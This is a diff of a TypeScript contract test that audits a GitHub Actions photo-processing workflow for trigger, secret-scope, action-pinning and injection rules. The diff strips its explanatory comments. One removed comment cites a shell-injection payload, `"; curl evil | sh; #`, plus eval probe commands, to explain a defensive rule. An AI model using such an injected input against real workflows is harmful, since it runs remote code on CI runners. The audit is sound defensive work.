@@ -1,75 +1,3 @@
-/*
- * BIOME'S `noTemplateCurlyInString` IS OFF FOR THIS FILE, in `biome.json`'s `overrides`.
- *
- * Every `${{ … }}` below is GITHUB ACTIONS EXPRESSION SYNTAX inside a single-quoted JavaScript
- * string — `${{ secrets.CLOUDFLARE_ACCOUNT_ID }}` is what the workflow file literally contains, and
- * this suite's whole job is to compare workflow text character for character. The rule exists to
- * catch `'${foo}'` written where a template literal was meant, and here it fires on correct code
- * five times.
- *
- * SCOPED TO THIS ONE FILE, and file-scoped rather than five `biome-ignore` comments, because the
- * exemption is a property of the whole file: every one of these strings is YAML by construction. A
- * per-line ignore would also have to be re-placed every time an assertion moves, and a stale ignore
- * is worse than none. Any OTHER file that trips this rule still fails, which is the point.
- */
-
-/**
- * The contract test for `.github/workflows/process-photos.yml` (plan 04-08, Task 3).
- *
- * WHY IT PARSES THE YAML INSTEAD OF GREPPING IT
- * ---------------------------------------------
- * Two of the rules below cannot be checked with a regex over the file. `${{ inputs.alt }}` can
- * hide inside a multi-line block scalar, where a line-oriented grep for `run:` never looks; and
- * "no secret above step level" is a question about WHERE a key sits in the tree, which a text
- * search cannot answer at all. So the file is parsed once and every rule is asked of the
- * document. The two rules that genuinely are textual — the legacy origin, and the 40-hex SHA
- * suffix on a `uses:` value — say so where they are written.
- *
- * WHY THE RULES LIVE IN A FUNCTION AND NOT IN THE `it` BODIES
- * ----------------------------------------------------------
- * `auditWorkflow(source)` returns a tagged finding list, so the same rules can be pointed at a
- * DELIBERATELY BROKEN copy of the workflow. That is what the second half of this file does: it
- * plants TEN defects, one per rule, and requires each to produce EXACTLY ONE finding carrying its
- * own rule id. A single "the workflow is valid" assertion that reddens for all ten for the same
- * reason is one assertion wearing ten hats, and plan 04-08 says so explicitly. (The plan asked
- * for seven; A7, A10 and A11 are three more rules this file added, so they are planted too.)
- *
- * THE `on:` KEY IS A TRAP, AND IT IS GUARDED
- * ------------------------------------------
- * Under the YAML 1.1 schema (`js-yaml`'s default, and every YAML tutorial written before 2009)
- * the bare word `on` parses as the BOOLEAN `true`, so `doc.on` is `undefined` and the trigger
- * block hides under `doc[true]`. Every trigger assertion would then pass over nothing. `yaml` v2
- * uses the 1.2 core schema and keeps it a string — asserted below rather than trusted, because
- * a future swap of parser is exactly the change that would silently disarm rules 1, 2 and 3.
- *
- * THE PARSER IS AN UNDECLARED DEPENDENCY, AND THAT IS RECORDED RATHER THAN HIDDEN
- * -----------------------------------------------------------------------------
- * `yaml` 2.9.0 resolves at the top of `node_modules` as a TRANSITIVE dependency of `vite` (via
- * `astro`) and `@astrojs/yaml2ts`. It is in the committed lockfile, so `npm ci` installs it
- * deterministically and CI has it — but nothing in `package.json` asks for it, so a future Vite
- * release that drops it would take this file with it. Plan 04-08 could not add the declaration:
- * `package.json` belonged to a plan running in the same wave. The failure mode is a loud
- * `Cannot find module 'yaml'` at import, never a vacuous pass, which is why this was recorded
- * and shipped rather than worked around with a hand-rolled parser. PROMOTE `yaml` TO A DIRECT
- * devDependency.
- *
- * THE RESIDUAL BOUNDARY ON RULE A9, MEASURED RATHER THAN ASSUMED
- * -------------------------------------------------------------
- * A9 refuses `${{ inputs.… }}` inside a `run:` block, because Actions substitutes that text
- * BEFORE bash is started: a `title` of `"; curl evil | sh; #` becomes shell source. It does NOT
- * refuse a `run:` block that reads `$ALT` after the value arrived through `env:`, and that is
- * correct rather than an oversight — bash expands a parameter, it does not re-parse the result
- * as code. MEASURED in GNU bash 5.3.9 on 2026-08-27, not assumed:
- *
- *     ALT='$(touch /tmp/probe)' bash -c 'echo $ALT'   -> printed the text, created NO file
- *     ALT='$(touch /tmp/probe)' bash -c 'eval "echo $ALT"' -> created the file
- *
- * So the residual is exactly `eval "$VAR"` / `sh -c "$VAR"`, which A9 does not look for and
- * which this workflow does not contain. That hole is written down here rather than papered over
- * with a rule that would give false coverage — and the last assertion in this file pins that
- * `eval ` is absent from the workflow, which is the part a test can actually hold.
- */
-
 import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
@@ -82,34 +10,8 @@ const REPO_ROOT = fileURLToPath(new URL('../..', import.meta.url));
 const WORKFLOW_RELATIVE = '.github/workflows/process-photos.yml';
 const WORKFLOW_PATH = `${REPO_ROOT}${WORKFLOW_RELATIVE}`;
 
-/** `workflow_dispatch` accepts at most this many top-level inputs. */
 const DISPATCH_INPUT_LIMIT = 25;
 
-/**
- * WHICH SECRET MAY APPEAR IN WHICH STEP — and nothing else may appear anywhere.
- *
- * THIS REPLACED A COUNT, AND THE REPLACEMENT IS THE POINT (plan 04-09).
- *
- * Until 04-09 this file asserted `expect(carriers).toHaveLength(1)`: exactly one step in the
- * workflow may reference `secrets.*`. That was true while the only credential was the App key
- * pair, and it stopped being true the moment the processing step needed R2 credentials — a
- * legitimate change that the assertion could only report as a failure.
- *
- * Bumping the `1` to a `2` would have been the weakening it looks like: `2` is satisfied by any
- * two steps holding any secrets, including the App private key sitting in the step that shells
- * out to `node`. So the count is gone and the SHAPE is enumerated instead, which is this
- * repository's standing lesson from `04-VALIDATION.md` hazard 14 — a token deny-list for git argv
- * was defeated three ways while the guard stayed silent, and the fix was to enumerate the
- * permitted shape rather than the forbidden spellings.
- *
- * What A12 now holds, and what the old count could not:
- *   - every `secrets.X` in the file is one of these four names (no unknown secret, anywhere);
- *   - each one appears in EXACTLY ONE step;
- *   - that step is the one named here — the App key pair only in the step that mints the token,
- *     the Cloudflare pair only in the step that does the R2 I/O;
- *   - and every name listed here appears at least once, so the allow-list cannot rot into a list
- *     of secrets nobody uses while the workflow quietly reads different ones.
- */
 const SECRET_SCOPES: ReadonlyArray<{ secret: string; step: RegExp; why: string }> = [
   { secret: 'PHOTO_PIPELINE_APP_ID', step: /mint/i, why: 'OD-8 A — the App identity' },
   { secret: 'PHOTO_PIPELINE_APP_PRIVATE_KEY', step: /mint/i, why: 'OD-8 A — the App private key' },
@@ -117,10 +19,8 @@ const SECRET_SCOPES: ReadonlyArray<{ secret: string; step: RegExp; why: string }
   { secret: 'CLOUDFLARE_ACCOUNT_ID', step: /process/i, why: 'OD-5 B — wrangler r2 object' },
 ];
 
-/** The entrypoint the workflow must actually run. A14 checks the file is really there. */
 const ENTRYPOINT = 'scripts/process-photo.mjs';
 
-/** The two DNS labels of the legacy development origin, joined here so this file holds no copy. */
 const LEGACY_ORIGIN_RE = new RegExp(
   `pub-[0-9a-f]+\\.${['r2', 'dev'].join('\\.')}|\\.r2\\.dev`,
   'i'
@@ -136,11 +36,6 @@ type Counts = {
   runBlocks: number;
 };
 
-/**
- * Reads the workflow, refusing an absent or empty file rather than reporting a clean audit of
- * nothing. Plan 04-08's "NOTHING TO CHECK" step is this function's whole reason for existing as
- * something separate from the audit.
- */
 function loadWorkflow(absolutePath: string): string {
   let source: string;
   try {
@@ -159,7 +54,6 @@ function loadWorkflow(absolutePath: string): string {
   return source;
 }
 
-/** Depth-first serialisation of a subtree, for the textual scope rules. */
 const asText = (value: unknown): string => JSON.stringify(value ?? null);
 
 function auditWorkflow(source: string): { findings: Finding[]; counts: Counts } {
@@ -175,7 +69,6 @@ function auditWorkflow(source: string): { findings: Finding[]; counts: Counts } 
     };
   }
 
-  // The `on:`-is-a-boolean trap. If this fires, rules A1..A3 would otherwise pass over nothing.
   if (!('on' in doc)) {
     add(
       'A0',
@@ -210,7 +103,6 @@ function auditWorkflow(source: string): { findings: Finding[]; counts: Counts } 
     runBlocks: runBlocks.length,
   };
 
-  /* -- A1: the trigger KEY SET, not merely the presence of workflow_dispatch ---------------- */
   const triggerKeys = Object.keys(triggers);
   if (triggerKeys.length !== 1 || triggerKeys[0] !== 'workflow_dispatch') {
     add(
@@ -220,7 +112,6 @@ function auditWorkflow(source: string): { findings: Finding[]; counts: Counts } 
     );
   }
 
-  /* -- A2: the inputs cannot drift from DISPATCH_INPUTS ------------------------------------- */
   const declaredNames = DISPATCH_INPUTS.map((input) => input.name);
   const yamlNames = Object.keys(inputs);
   if (yamlNames.join(',') !== declaredNames.join(',')) {
@@ -245,7 +136,6 @@ function auditWorkflow(source: string): { findings: Finding[]; counts: Counts } 
     }
   }
 
-  /* -- A3: the documented ceiling ----------------------------------------------------------- */
   if (counts.inputs > DISPATCH_INPUT_LIMIT) {
     add(
       'A3',
@@ -253,7 +143,6 @@ function auditWorkflow(source: string): { findings: Finding[]; counts: Counts } 
     );
   }
 
-  /* -- A4: queue, do not cancel ------------------------------------------------------------- */
   const concurrency = (doc.concurrency ?? {}) as Record<string, unknown>;
   if (concurrency['cancel-in-progress'] !== false) {
     add(
@@ -267,7 +156,6 @@ function auditWorkflow(source: string): { findings: Finding[]; counts: Counts } 
     add('A4', 'concurrency.group is missing or empty, so nothing is serialised');
   }
 
-  /* -- A5: every action pinned to a full commit SHA (textual, by nature) -------------------- */
   if (usesValues.length === 0) {
     add('A5', 'no `uses:` entries were found, so the pinning rule would loop over nothing');
   }
@@ -430,7 +318,6 @@ function auditWorkflow(source: string): { findings: Finding[]; counts: Counts } 
     }
   }
 
-  /* -- A14: the workflow actually runs the entrypoint, and the entrypoint exists -------------- */
   if (!runBlocks.some((block) => block.includes(ENTRYPOINT))) {
     add(
       'A14',
